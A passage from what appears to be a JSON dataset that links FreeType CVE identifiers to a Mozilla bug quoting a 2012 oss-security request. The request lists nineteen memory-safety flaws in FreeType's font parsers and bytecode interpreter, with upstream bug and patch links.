http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1137": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1138": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1139": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field 